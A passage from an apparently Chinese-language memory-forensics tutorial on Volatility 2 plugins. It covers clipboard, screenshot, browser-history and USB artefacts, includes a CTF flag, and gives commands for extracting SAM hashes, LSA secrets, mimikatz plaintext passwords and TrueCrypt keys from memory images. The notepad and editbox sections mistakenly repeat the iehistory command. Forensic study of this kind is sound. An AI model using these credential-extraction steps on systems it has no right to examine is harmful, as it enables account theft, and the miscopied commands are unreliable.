&lt;p&gt;从Windows10版本1803开始，&lt;code&gt;ActivitiesCache.db&lt;/code&gt;就开始记录剪贴板活动了，不过前提是要打开下面的设置：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715200841039&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715200841039.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715200841039.png&#34; alt=&#34;image-20250715200841039&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;随后，在下面的路径找到&lt;code&gt;ActivitiesCache.db&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#98c379&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#98c379&#34;&gt;\&amp;lt;&lt;/span&gt;username&amp;gt;&lt;span style=&#34;color:#98c379&#34;&gt;\A&lt;/span&gt;ppData&lt;span style=&#34;color:#98c379&#34;&gt;\L&lt;/span&gt;ocal&lt;span style=&#34;color:#98c379&#34;&gt;\C&lt;/span&gt;onnectedDevicesPlatform&lt;span style=&#34;color:#98c379&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用数据库链接后，使用它自带的&lt;code&gt;SmartLookup&lt;/code&gt;视图：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715200733649&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715200733649.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715200733649.png&#34; alt=&#34;image-20250715200733649&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里我的ClipboardPayload字段为空，是因为我没有打开剪贴板历史记录，嘻嘻&lt;/p&gt;
&lt;h3 id=&#34;查看窗口图像screeenshot&#34;&gt;查看窗口图像（screeenshot）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;从内存中提取窗口图像甚至恢复桌面画面，截图内容通常是窗口的客户区域，不是全屏桌面&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;需要安装Pillow库：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install Pillow
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;使用的同时必须指定保存路径（&amp;ndash;dump-dir=）&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; screenshot --dump-dir&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;保存路径
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250706225854144.png&#34; alt=&#34;image-20250706225854144&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;文件名&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;session_0&lt;/td&gt;
          &lt;td&gt;会话 0，表示本地物理桌面用户或服务（如 SYSTEM）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;WinSta0&lt;/td&gt;
          &lt;td&gt;用户交互的窗口站（Window Station），默认GUI桌面就在这里&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Default&lt;/td&gt;
          &lt;td&gt;当前活动桌面&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Winlogon&lt;/td&gt;
          &lt;td&gt;登录界面桌面，可能在锁屏状态时显示&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Disconnect&lt;/td&gt;
          &lt;td&gt;断开连接时显示的桌面（比如远程桌面断开）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Service-0x0-3e7$&lt;/td&gt;
          &lt;td&gt;代表SYSTEM服务账户的窗口站&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;mssrestricteddesk&lt;/td&gt;
          &lt;td&gt;某些安全子系统（如 Speech 或 Office 隔离）的沙盒桌面&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;比如我这里获得的一张当时的屏幕截图&lt;code&gt;session_2.WinSta0.Default.png&lt;/code&gt;，说明用户在查看一张图片：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250715204836602&#34; href=&#34;http://picture.928330.xyz/typora/image-20250715204836602.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250715204836602.png&#34; alt=&#34;image-20250715204836602&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;图片名base64解码就是flag：&lt;code&gt;flag{!!_w3LL_d0n3_St4g3-1_0g_L4B_5_D0n3_!!}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看记事本中的内容notepad&#34;&gt;查看记事本中的内容（notepad）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;本质是扫描记事本进程&lt;code&gt;notepad.exe&lt;/code&gt;，还原的是正在显示和编辑的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看用户可能编辑的内容editbox&#34;&gt;查看用户可能编辑的内容（editbox）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;它比&lt;code&gt;notepad&lt;/code&gt;插件更加通用，不只针对记事本，而是扫描所有进程的内存，寻找所有编辑控件并提取文本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看ie浏览器历史记录iehistory&#34;&gt;查看ie浏览器历史记录（iehistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; iehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看chrome浏览器历史记录chromehistory&#34;&gt;查看chrome浏览器历史记录（chromehistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;chromehistory&lt;/code&gt;和&lt;code&gt;sqlite_help&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; chromehistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看firefox浏览器历史记录firefoxhistory&#34;&gt;查看firefox浏览器历史记录（firefoxhistory）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;firefoxhistory&lt;/code&gt;和&lt;code&gt;sqlite_help&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; firefoxhistory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;根据历史记录，我们可以去内存中查找是否有对应的文件&lt;/strong&gt;：&lt;a class=&#34;link&#34; href=&#34;#%e6%96%87%e4%bb%b6%e6%89%ab%e6%8f%8f%e4%b8%8e%e6%8f%90%e5%8f%96&#34; &gt;文件扫描与提取
    
&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看已安装的软件uninstallinfo&#34;&gt;查看已安装的软件（uninstallinfo）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;uninstallinfo&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins/blob/master&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins/blob/master
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; uninstallinfo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看查入系统的usb设备usbstor&#34;&gt;查看查入系统的USB设备（usbstor）
&lt;/h3&gt;&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;volatility3没有此功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要下载插件&lt;code&gt;usbstor&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; usbstor
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;密码和凭证获取仅volatility2&#34;&gt;密码和凭证获取（仅volatility2）
&lt;/h2&gt;&lt;p&gt;&lt;span style=&#34;color:red;font-size:23px&#34;&gt;&lt;strong&gt;volatility3没有下面的功能&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取本地账户哈希hashdump&#34;&gt;提取本地账户哈希（hashdump）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;使用SYSTEM里面的SYSKEY提取SAM中的密码哈希&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; hashdump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出格式是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;用户名&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;RID&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;LM哈希&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:&lt;/span&gt;[&lt;span style=&#34;color:#e06c75&#34;&gt;NTLM哈希&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;:::&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250704120945088&#34; href=&#34;http://picture.928330.xyz/typora/image-20250704120945088.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704120945088.png&#34; alt=&#34;image-20250704120945088&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;提取lsa密钥lsadump&#34;&gt;提取LSA密钥（lsadump）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;lsa是本地安全机构，通过它可以获取当前登录用户、服务账户等多种形式的凭证，甚至可能是明文密码&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; lsadump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以hex转储的形式输出，可能藏有东西&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704120913200.png&#34; alt=&#34;image-20250704120913200&#34; style=&#34;zoom:50%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;DefaultPassword&lt;/code&gt;&lt;/strong&gt;：系统为自动登录功能存储的密码，如果设置了就是对应用户的密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;NL$KM&lt;/code&gt;&lt;/strong&gt;：计算机的密钥，用于计算机和域控制器之间进行安全的通信和认证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;DPAPI_SYSTEM&lt;/code&gt;&lt;/strong&gt;：系统级DPAPI的主密钥，用于解密用户保存的各种密码（浏览器里的、wifi密码等）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;提取明文密码mimikatz&#34;&gt;提取明文密码（mimikatz）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;实际上也是从lsass.exe里面提取，是lsadump的特化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;非官方插件，需要下载：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;还需要安装依赖，必须是对应旧版本的&lt;code&gt;construct&lt;/code&gt;库：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e5c07b&#34;&gt;source&lt;/span&gt; /home/kali/volatility2/venv_volatility2/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip2 install &lt;span style=&#34;color:#e06c75&#34;&gt;construct&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;==&lt;/span&gt;2.5.2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deactivate
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后就可以使用了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; mimikatz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250708203501496&#34; href=&#34;http://picture.928330.xyz/typora/image-20250708203501496.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250708203501496.png&#34; alt=&#34;image-20250708203501496&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看chrome记录的登录密码lastpass&#34;&gt;查看Chrome记录的登录密码（lastpass）
&lt;/h3&gt;&lt;p&gt;需要下载插件&lt;code&gt;lastpass&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; lastpass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;获取truecrypt秘钥信息truecryptmaster&#34;&gt;获取TrueCrypt秘钥信息（truecryptmaster）
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; truecryptmaster 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;获取truecrypt密码信息-truecryptpassphrase&#34;&gt;获取TrueCrypt密码信息 （truecryptpassphrase）
